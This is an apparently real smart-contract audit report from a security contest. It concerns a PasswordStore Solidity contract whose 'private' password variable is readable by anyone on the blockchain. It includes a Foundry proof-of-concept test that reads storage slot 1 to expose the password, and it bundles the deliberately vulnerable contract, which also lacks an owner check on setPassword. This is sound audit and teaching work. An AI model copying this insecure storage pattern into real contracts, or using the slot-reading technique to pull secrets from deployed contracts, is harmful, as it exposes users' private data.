{
  "Title": "Owner's password stored in the `s_password` state variable is not a secret and can be seen by everyone",
  "Content": "# Owner's password stored in the `s_password` state variable is not a secret and can be seen by everyone\n\n### Severity\nHigh Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L14\">https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L14</a>\n\n\n## Summary\n\nThe protocol is using a `private` state variable to store the owner's password under the assumption that being a \"private\" variable its value is a secret from everyone else except the owner; which is a completely false assumption.\n\nIn Solidity, marking a variable as `private` doesn't mean that the data stored in that variable is entirely secret or private from all observers of the blockchain. While it restricts direct external access to the variable from other contracts, it's essential to understand that the data on the blockchain is inherently transparent and can be viewed by anyone. Other smart contracts and blockchain explorers can still access and read the data if they know where to look. \n\n'Private' in Solidity primarily provides encapsulation and access control within the contract itself, rather than offering complete data privacy on the public blockchain.\n\n## Vulnerability Details\n\n```solidity\nstring private s_password;\n```\n\nAforementioned is the `s_password` variable which is being assumed as a secret by the protocol for it being a `private` variable. This is a completely false assumption since all data on the blockchain is public.\n\n## Proof of Concept\n\n### Actors:\n- **Attacker**: Any non-owner malicious actor on the network. \n- **Victim**: Owner of the PasswordStore protocol.\n- **Protocol**: PasswordStore is meant to allow only the owner to store and retrieve their password securely.\n\n\n### Working Test Case:   \n(**Note :** Though the following code fetches the Victim's password correctly in ASCII format; with my current skills in Solidity I've been struggling to make the `assertEq()` function return `true` when comparing the two strings. The problem seems to be with how the result of `abi.encodePacked()` for `anyoneCanReadPassword` variable fetched from `vm.load` has a bunch of trailing zeroes in it while the same for `victimPassword` doesn't.\n\nTherefore my current POC proves the exploit by using `console.log` instead of `assertEq`\n)   \n  \nWrite and run the following test case in the `PasswordStore.t.sol` test file.\n\n```solidity\nfunction test_any_non_owner_can_see_password() public {\n    string memory victimPassword = \"mySecretPassword\"; // Defines Victim's (Owner's) password\n    vm.startPrank(owner); // Simulates Victim's address for the next call\n    passwordStore.setPassword(victimPassword); // Victim sets their password\n\n    // At this point, Victim thinks their password is now \"privately\" stored on the protocol and is completely secret.\n    // The exploit code that now follows can be performed by just about everyone on the blockchain who are aware of the Victim's protocol and can access and read the Victim's password.\n\n    /////////// EXPLOIT CODE performed by Attacker ///////////\n\n    // By observing the protocol's source code at `PasswordStore.sol`, we notice that `s_password` is the second storage variable declared in the contract. Since storage slots are alloted in the order of declaration in the EVM, its slot value will be '1'\n    uint256 S_PASSWORD_STORAGE_SLOT_VALUE = 1;\n\n    // Access the protocol's storage data at slot 1\n    bytes32 slotData = vm.load(\n        address(passwordStore),\n        bytes32(S_PASSWORD_STORAGE_SLOT_VALUE)\n    );\n\n    // Converting `bytes` data to `string`\n    string memory anyoneCanReadPassword = string(\n        abi.encodePacked(slotData)\n    );\n    // Exposes Victim's password on console\n    console.log(anyoneCanReadPassword);\n}\n\n```\n\nMake sure to run the test command with `-vv` flag to see the `Logs` in command output.    \n\n\n## Impact\nThis vulnerability completely compromises the confidentiality of the protocol and exposes the sensitive private data of the owner of the protocol to everyone on the blockchain.\n\n## Tools Used\nFoundry\n\n## Recommendations\n\nAll data on the blockchain is public. To store sensitive information, additional encryption or off-chain solutions should be considered. Sensitive and personal data should never be stored on the blockchain in plaintext or weakly encrypted or encoded format. ",
  "Impact": "HIGH",
  "Source": "https://www.codehawks.com/contests/clnuo221v0001l50aomgo4nyn",
  "Code": [
    {
      "filename": "src/PasswordStore.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n\n/*\n * @author not-so-secure-dev\n * @title PasswordStore\n * @notice This contract allows you to store a private password that others won't be able to see. \n * You can update your password at any time.\n */\ncontract PasswordStore {\n    error PasswordStore__NotOwner();\n\n    address private s_owner;\n    string private s_password;\n\n    event SetNetPassword();\n\n    constructor() {\n        s_owner = msg.sender;\n    }\n\n    /*\n     * @notice This function allows only the owner to set a new password.\n     * @param newPassword The new password to set.\n     */\n    function setPassword(string memory newPassword) external {\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n\n    /*\n     * @notice This allows only the owner to retrieve the password.\n     * @param newPassword The new password to set.\n     */\n    function getPassword() external view returns (string memory) {\n        if (msg.sender != s_owner) {\n            revert PasswordStore__NotOwner();\n        }\n        return s_password;\n    }\n}"
    }
  ]
}